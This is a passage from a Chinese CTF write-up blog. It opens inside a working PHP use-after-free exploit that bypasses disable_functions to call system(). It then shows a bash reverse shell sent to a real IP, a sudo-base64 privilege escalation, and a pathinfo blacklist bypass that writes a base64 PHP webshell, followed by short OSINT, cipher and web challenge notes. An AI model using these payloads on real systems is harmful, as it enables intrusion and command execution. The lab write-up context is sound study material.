invoke__">log</span>(<span class="string">&quot;zif_system @ 0x%x&quot;</span>, <span class="variable">$zif_system</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fake_closure_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE * <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x138</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="variable">$i</span>, <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$closure_addr</span> + <span class="variable">$i</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$handler_offset</span> = PHP_MAJOR_VERSION === <span class="number">8</span> ? <span class="number">0x70</span> : <span class="number">0x68</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$fake_closure_off</span> + <span class="variable">$handler_offset</span>, <span class="variable">$zif_system</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fake_closure_addr</span> = <span class="variable language_">$this</span>-&gt;helper_addr + <span class="variable">$fake_closure_off</span> - <span class="variable language_">$this</span>-&gt;helper_off;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable language_">$this</span>-&gt;helper_off + <span class="number">0x38</span>, <span class="variable">$fake_closure_addr</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;fake closure @ 0x%x&quot;</span>, <span class="variable">$fake_closure_addr</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">cleanup</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]==<span class="number">1</span>)     <span class="comment">#静态靶机，shell不给别人用，突出一个小气</span></span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;helper-&gt;b)(CMD);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">make_uaf_obj</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;uafp = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable language_">$this</span>-&gt;uafp, <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;QQQ&#x27;</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0xDEADBAADC0DE</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; STRING_SIZE; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable language_">$this</span>-&gt;uafp, <span class="string">&quot;\x00&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_leaker</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$str_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="number">8</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$str_off</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$str_off</span> + <span class="number">0x10</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$val_off</span> = <span class="variable language_">$this</span>-&gt;helper_off + <span class="number">0x48</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$val_off</span>, <span class="variable language_">$this</span>-&gt;helper_addr + CHUNK_SIZE + <span class="number">8</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$val_off</span> + <span class="number">8</span>, <span class="number">0xA</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare_cleanup</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$ret_gadget</span> = <span class="variable">$binary_leak</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            --<span class="variable">$ret_gadget</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$ret_gadget</span>, <span class="number">1</span>) !== <span class="number">0xC3</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;ret gadget = 0x%x&quot;</span>, <span class="variable">$ret_gadget</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0</span>, <span class="variable language_">$this</span>-&gt;abc_addr + <span class="number">0x20</span> - (PHP_MAJOR_VERSION === <span class="number">8</span> ? <span class="number">0x50</span> : <span class="number">0x60</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">8</span>, <span class="variable">$ret_gadget</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable language_">$this</span>-&gt;helper_off + CHUNK_SIZE + <span class="number">16</span>, <span class="variable">$addr</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$value</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable language_">$this</span>-&gt;helper-&gt;c);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$n</span> !== <span class="number">8</span>) &#123; <span class="variable">$value</span> &amp;= (<span class="number">1</span> &lt;&lt; (<span class="variable">$n</span> &lt;&lt; <span class="number">3</span>)) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;abc[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$addr</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="comment">// In rare instances the standard module might lie after the addr we&#x27;re starting</span></span><br><span class="line">            <span class="comment">// the search from. This will result in a SIGSGV when the search reaches an unmapped page.</span></span><br><span class="line">            <span class="comment">// In that case, changing the direction of the search should fix the crash.</span></span><br><span class="line">            <span class="comment">// $addr += 0x10;</span></span><br><span class="line">            <span class="variable">$addr</span> -= <span class="number">0x10</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span>, <span class="number">4</span>) === <span class="number">0xA8</span> &amp;&amp;</span><br><span class="line">                <span class="title function_ invoke__">in_array</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">4</span>, <span class="number">4</span>),</span><br><span class="line">                    [<span class="number">20151012</span>, <span class="number">20160303</span>, <span class="number">20170718</span>, <span class="number">20180731</span>, <span class="number">20190902</span>, <span class="number">20200930</span>])) &#123;</span><br><span class="line">                <span class="variable">$module_name_addr</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">0x20</span>);</span><br><span class="line">                <span class="variable">$module_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$module_name_addr</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$module_name</span> === <span class="number">0x647261646e617473</span>) &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">log</span>(<span class="string">&quot;standard module @ 0x%x&quot;</span>, <span class="variable">$addr</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">0x28</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$f_entry</span>, <span class="number">6</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> === <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> !== <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hfp = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable language_">$this</span>-&gt;hfp, <span class="title function_ invoke__">pack</span>(<span class="string">&#x27;QQ&#x27;</span>, <span class="number">0</span>, <span class="variable language_">$this</span>-&gt;abc_addr));</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; FILTER_SIZE - <span class="number">0x10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable language_">$this</span>-&gt;hfp, <span class="string">&quot;\x00&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params"><span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$n</span> - <span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable language_">$this</span>-&gt;abc[<span class="variable">$p</span> + <span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"><span class="variable">$format</span>, <span class="variable">$val</span> = <span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(LOGGING) &#123;</span><br><span class="line">            <span class="title function_ invoke__">printf</span>(<span class="string">&quot;<span class="subst">&#123;$format&#125;</span>\n&quot;</span>, <span class="variable">$val</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">alloc</span>(<span class="params"><span class="variable">$size</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">str_shuffle</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;A&#x27;</span>, <span class="variable">$size</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>1&#x3D;1&amp;muhua&#x3D;ls &#x2F;</p>
</blockquote>
<p>成功执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">cat /hint</span><br><span class="line">flag in /root</span><br><span class="line"></span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/bin/mount </span><br><span class="line">/bin/su </span><br><span class="line">/bin/umount </span><br><span class="line">/usr/bin/passwd </span><br><span class="line">/usr/bin/chfn </span><br><span class="line">/usr/bin/newgrp </span><br><span class="line">/usr/bin/gpasswd </span><br><span class="line">/usr/bin/chsh </span><br><span class="line">/usr/bin/sudo </span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line"></span><br><span class="line">弹个shell到服务器</span><br><span class="line">1=1&amp;muhua=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F47.107.56.244%2F8083%200%3E%261%22</span><br><span class="line"></span><br><span class="line">ls /root</span><br><span class="line">permission denied</span><br></pre></td></tr></table></figure>

<p>没权限，需要提权：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">查看版本</span><br><span class="line">cat /etc/issue</span><br><span class="line">ubuntu16.04.7</span><br><span class="line"></span><br><span class="line">CVE-2017-16995</span><br></pre></td></tr></table></figure>
<p>找到<code>get-rekt-linux-hardened.c</code>，编译上传，但执行失败了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux 016873026edb 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<p>赛后：</p>
<p>很好，提不出，最后寄了，只能说，即使无限接近真相，没解出题目就是0分</p>
<p>真相就是上面使用：</p>
<blockquote>
<p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null<br>指令得到的东西，我也试过sudo，但缺乏经验没注意到，sudo -l查到base64指令是不需要root密码的</p>
</blockquote>
<p>于是根据根目录下的hint，直接查：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo base64 /root/flag | base64 --decode</span><br><span class="line"><span class="comment"># flag:&#123;awa35_546fn79rhd3ad65_54a3c6a79d&#125;</span></span><br></pre></td></tr></table></figure>

<p>官方似乎没考虑到assert，直接寄，官方预期解就是想利用这个函数执行点执行传文件函数，文件内容是设置的三个，email地址，用户名，密码，直接抓包传设置用户地址为base64加密的一句话，然后在任意函数执行处进行一个传</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$log_name</span>))&#123;</span><br><span class="line">    <span class="variable">$log_name</span> = <span class="keyword">isset</span>(<span class="variable">$log_name</span>) ? <span class="variable">$log_name</span> : <span class="title function_ invoke__">date</span>(<span class="string">&#x27;-Y-m-d&#x27;</span>);</span><br><span class="line">    <span class="variable">$smtp_log</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;smtpserver&#x27;</span>].<span class="string">&quot;\n&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;smtpuser&#x27;</span>].<span class="string">&quot;\n&quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;smtppass&#x27;</span>];</span><br><span class="line">    <span class="variable">$smtp_log</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$smtp_log</span>, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line">    <span class="variable">$blacklists</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;php1&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;pHp5&quot;</span>,<span class="string">&quot;pHp4&quot;</span>,<span class="string">&quot;pHp3&quot;</span>,<span class="string">&quot;pHp2&quot;</span>,<span class="string">&quot;pHp1&quot;</span>,<span class="string">&quot;Html&quot;</span>,<span class="string">&quot;Htm&quot;</span>,<span class="string">&quot;pHtml&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$log_name</span>, PATHINFO_EXTENSION), <span class="variable">$blacklists</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$log_name</span>, <span class="variable">$smtp_log</span>);</span><br><span class="line">        <span class="variable">$filepath</span> = <span class="variable">$log_path</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$log_name</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$filepath</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>做的时候想到传，但没想到怎么绕那个pathinfo，之前其实遇到过，没深入看，在地址后加一个<code>/.</code>即可让它返回为空，自然也就不会被黑名单拦</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用setting.php写入base64的马</span></span><br><span class="line"><span class="comment"># settings.php</span></span><br><span class="line">POST: smtppass=VRVNUWzFdKTsgPz4%3D&amp;smtpserver=PD9waHAgQGV&amp;smtpuser=2YWwoJF9SRVF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在index.php处调用文件上传将文件传入指定shell文件，即可利用</span></span><br><span class="line">http://121.40.89.206:25791/index.php?select=smtp_logs&amp;addr=php://filter/convert.base64-decode/resource=smilemoonsupershellwuhu.php/.</span><br></pre></td></tr></table></figure>

<p>接着对于<code>open_basedir</code>和命令执行的预期是打 php-imagick</p>
<p>通常都是利用<code>LD_PRELOAD</code>，mail和so文件绕过，这里mail被ban了，但其实mail函数的原理是会加载动态库函数，然后改变环境变量<code>LD_PRELOAD</code>，触发新进程从而劫持，执行so文件，最终达到绕过<code>disable_function</code>和<code>open_basedir</code>执行命令的效果</p>
<p>具体方法就不总结在这里了，放个官方wp：<br><span class="exturl" data-url="aHR0cHM6Ly9wd25odWIuY24vbWVkaWEvd3JpdGV1cC84OC9Xcml0ZXVwX01vY2tpbmdNYWlsLnBkZg==">官方wp</span></p>
<h1 id="单身杯-ctfshow"><a href="#单身杯-ctfshow" class="headerlink" title="_单身杯 ctfshow"></a>_单身杯 ctfshow</h1><h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="任性老板"><a href="#任性老板" class="headerlink" title="任性老板"></a>任性老板</h3><p>web好卡，看看别的，又有社工，查看图片，提取关键字，只卖一种面，干拌面，根据口音是四川的（咱是四川人嘛）加上说的是自家的房子，那肯定是四川了，加上几个不卖，查，四川只卖干拌面，还挺有名，啥规矩最多，顺藤摸瓜，于是找到店名：左撇子私房面，然后直接搜名字，最后在大众点评上找到电话：15882424927</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;左撇子私房面_15882424927&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="The-Dancing-Men"><a href="#The-Dancing-Men" class="headerlink" title="The Dancing Men"></a>The Dancing Men</h3><p>闲着也是闲着，看看密码，经典跳舞的小人，我嬲，这什么勾八flag啊怎么这么长，百度个对照表，和密文放一起，开始手动解，跳舞小人是有大小写的，举旗为大写，很快发现大写结尾为一个单词，按照意思解，单词翻译不过来就是解错了，最后解出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pleasE usE underslasH betweeN everY worD witH initialS iN capitalS thE flaG iS everyonE loveS taosheN</span><br></pre></td></tr></table></figure>
<p>发现前面是要求，最后一点才是flag，下划线连接，单词首字母大写，最后用格式包起来：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;Everyone_Loves_Taoshen&#125;</span><br></pre></td></tr></table></figure>


<h1 id="2022DASCTF-MAY-出题人挑战赛"><a href="#2022DASCTF-MAY-出题人挑战赛" class="headerlink" title="2022DASCTF MAY 出题人挑战赛"></a>2022DASCTF MAY 出题人挑战赛</h1><h2 id="web-4"><a href="#web-4" class="headerlink" title="web"></a>web</h2><h3 id="Power-Cookie"><a href="#Power-Cookie" class="headerlink" title="Power Cookie"></a>Power Cookie</h3><p>很多人出了，题目又这么明显，直接抓包</p>
<p>访问<code>/check</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: admin=0;</span><br></pre></td></tr></table></figure>

<p>改成<code>admin=1</code>带着这个cookie变量再次访问<code>/check</code>，出了</p>
<h3 id="魔法浏览器"><a href="#魔法浏览器" class="headerlink" title="魔法浏览器"></a>魔法浏览器</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag.<span class="property">txt</span></span><br><span class="line">为保证文档安全。请使用魔法浏览器来访问。</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">let</span> ua = <span class="string">&quot;\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30 \x28\x57\x69\x6e\x64\x6f\x77\x73 \x4e\x54 \x31\x30\x2e\x30\x3b \x57\x69\x6e\x36\x34\x3b \x78\x36\x34\x29 \x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36 \x28\x4b\x48\x54\x4d\x4c\x2c \x6c\x69\x6b\x65 \x47\x65\x63\x6b\x6f\x29 \x4d\x61\x67\x69\x63\x2f\x31\x30\x30\x2e\x30\x2e\x34\x38\x39\x36\x2e\x37\x35&quot;</span>;    <span class="variable language_">console</span>[<span class="string">&quot;\x6c\x6f\x67&quot;</span>](ua);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>十六进制解一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30 \x28\x57\x69\x6e\x64\x6f\x77\x73 \x4e\x54 \x31\x30\x2e\x30\x3b \x57\x69\x6e\x36\x34\x3b \x78\x36\x34\x29 \x41\x70\x70\x6c\x65\x57\x65\x62\x4b\x69\x74\x2f\x35\x33\x37\x2e\x33\x36 \x28\x4b\x48\x54\x4d\x4c\x2c \x6c\x69\x6b\x65 \x47\x65\x63\x6b\x6f\x29 \x4d\x61\x67\x69\x63\x2f\x31\x30\x30\x2e\x30\x2e\x34\x38\x39\x36\x2e\x37\x35</span><br><span class="line"></span><br><span class="line">Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Magic/100.0.4896.75</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>要把UA设置成这个，没反应，照着规范的UA改一下：</p>
<blockquote>
<p>Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;101.0.4951.67 Safari&#x2F;537.36</p>
</blockquote>
<p>成这样，发包</p>
<blockquote>
<p>Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Magic&#x2F;100.0.4896.75<br>出</p>
</blockquote>
<h3 id="getme"><a href="#getme" class="headerlink" title="getme"></a>getme</h3><p>Apache&#x2F;2.4.50 (Unix)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--  pwd:/usr/local/apache2/ --&gt;</span></span><br></pre></td></tr></table></figure>
<p>apache2.4.50的cve</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MzM0NDY0L2FydGljbGUvZGV0YWlscy8xMjA2ODU1MTg=">CVE-2021-42013-Apache HTTP Server 2.4.50路径穿越流量特征</span></p>
<p>直接照着拿来用就通了</p>
